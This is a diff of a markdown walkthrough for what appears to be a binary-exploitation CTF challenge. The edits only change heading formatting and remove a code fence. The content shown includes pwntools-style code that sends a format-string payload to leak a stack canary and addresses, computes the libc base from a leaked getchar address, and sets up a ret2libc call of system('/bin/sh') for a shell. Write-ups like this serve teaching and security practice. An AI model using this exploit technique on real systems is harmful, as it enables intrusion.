@@ -35,7 +35,7 @@ The goal is to **leak protected information** and exploit it to **gain a shell**
 
 The format string vulnerability allows leaking memory values:
 
-```py
+
 io.sendline(b'%17$p.%13$p')
 leak_line = io.recvline().strip()
 main_str, canary_str = leak_line.split(b'.')
@@ -43,7 +43,7 @@ main = int(main_str, 16)
 canary = int(canary_str, 16)
 
 
-2. Calculate Important Addresses
+### 2. Calculate Important Addresses
 
 Using known offsets:
 
@@ -63,7 +63,7 @@ This gives us:
 
     ret gadget for alignment
 
-3. Leak a libc Address
+### 3. Leak a libc Address
 
 We leak getchar's actual libc address via puts():
 
@@ -80,7 +80,7 @@ Parse the leaked address:
 getchar_libc = u64(io.recvline().strip().ljust(8, b"\x00"))
 libc_base = getchar_libc - getchar_libc_offset
 
-4. ret2libc: Execute system("/bin/sh")
+### 4. ret2libc: Execute system("/bin/sh")
 
 Once the libc base is known:
 
